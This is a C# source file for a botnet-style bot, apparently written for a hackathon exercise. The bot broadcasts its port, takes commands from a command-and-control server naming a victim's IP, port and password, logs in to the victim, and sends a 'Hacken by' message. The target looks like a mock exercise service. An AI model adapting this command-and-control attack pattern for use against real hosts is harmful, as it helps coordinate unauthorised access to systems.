using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HackatonBot
{
    class Bot
    {

        private int _listenPort;
        private UdpClient _udpClient;
        private IPEndPoint _IpEndPoint;

        public Bot()
        {   

            bool okPort = false;
            while (!okPort)
            {
                try
                {
                    _listenPort = choosePort();
                    _udpClient = new UdpClient(_listenPort);
                    okPort = true;
                }
                catch (Exception ex)
                {
                    okPort = false;
                }

            }
            
           

            _IpEndPoint = new IPEndPoint(IPAddress.Any, 0);

            Thread broadCaster = new Thread(SendBroadcast);
            broadCaster.Start();
            Thread listener = new Thread(Listen);
            listener.Start();

            Console.WriteLine("Bot is listening on port: " + _listenPort);
        }

        /// <summary>
        /// method to choose an open port
        /// </summary>
        /// <returns></returns>
        private int choosePort()
        {
            TcpListener listener = new TcpListener(IPAddress.Loopback, 0);
            listener.Start();
            int port = ((IPEndPoint)listener.LocalEndpoint).Port;
            listener.Stop();
            return port;
        }


        /// <summary>
        /// method to send broadcast messages with the chosen port
        /// </summary>
        private void SendBroadcast()
        {
            while (true)
            {
                try
                {
                    // setting broadcast udp client
                    IPEndPoint everybody = new IPEndPoint(IPAddress.Broadcast, 31337);
                    UdpClient broadcast = new UdpClient();

                    // sending listening port number 
                    byte[] port = BitConverter.GetBytes(_listenPort);
                    broadcast.Send(port, 2, everybody);
                    // Console.WriteLine("Bot sended broadcast with port: " + _listenPort);

                    Thread.Sleep(10000);

                }
                catch (SocketException ex)
                {
                    Console.WriteLine("Exception occured: {0}", ex);
                }
            }

        }

        /// <summary>
        /// method to listen to attack announcments
        /// </summary>
        public void Listen()
        {
            while (true)
            {
                byte[] data = _udpClient.Receive(ref _IpEndPoint);

                if (data == null ||
                    data.Length != 44)
                {
                    continue;
                }

                byte ip1 = data[0];
                byte ip2 = data[1];
                byte ip3 = data[2];
                byte ip4 = data[3];

                byte port1 = data[4];
                byte port2 = data[5];

                String password = Encoding.ASCII.GetString(data, 6, 6);
                String CNCServerName = Encoding.ASCII.GetString(data, 12, 32);

                String ipString = String.Format("{0}.{1}.{2}.{3}", ip1, ip2, ip3, ip4);
                int actualPort = -1;
                if (!BitConverter.IsLittleEndian)
                    actualPort = BitConverter.ToUInt16(new byte[2] { (byte)port2, (byte)port1 }, 0);
                else
                    actualPort = BitConverter.ToUInt16(new byte[2] { (byte)port1, (byte)port2 }, 0);

               // Console.WriteLine("Attacking victim with ip: " + ipString + ", port: " + actualPort + ", password: " + password + ", cncserver: " + CNCServerName);

                AttackVictim(ipString, actualPort, password, CNCServerName);

            }
        }

        /// <summary>
        /// method to attack a victim
        /// </summary>
        /// <param name="ipString"></param>
        /// <param name="actualPort"></param>
        /// <param name="password"></param>
        /// <param name="cNCServerName"></param>
        private void AttackVictim(string ipString, int actualPort, string password, string cNCServerName)
        {
            TcpClient client = new TcpClient();
            IPAddress address = IPAddress.Parse(ipString);
            ASCIIEncoding asen = new ASCIIEncoding();
            try
            {
                // connecting and getting stream
                client.Connect(address, actualPort);
                NetworkStream stream = client.GetStream();

                // recieving password request
                byte[] byteFromVictim = new byte[30];
                int recievedBytes = stream.Read(byteFromVictim, 0, 30);
                String fromVictim = asen.GetString(byteFromVictim, 0, recievedBytes);

               // Console.WriteLine("recieved massage from victim: " + fromVictim);

                if (!fromVictim.Contains("password\r\n"))
                {
                    return;
                }

                // sending password
                Byte[] toSend = asen.GetBytes(password + "\r\n");
                stream.Write(toSend, 0, toSend.Length);

                // might throw EXCEPTION
                recievedBytes = stream.Read(byteFromVictim, 0, 30);
                fromVictim = asen.GetString(byteFromVictim, 0, recievedBytes);
                if (!"Access granted".Equals(fromVictim))
                {
                    return;
                }

                // sending hacked massage
                toSend = asen.GetBytes("Hacken by " + cNCServerName + "\r\n");
                stream.Write(toSend, 0, toSend.Length);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.GetType().ToString());
            }

            finally
            {
                if (client != null)
                    client.Close();
            }
        }
    }
}
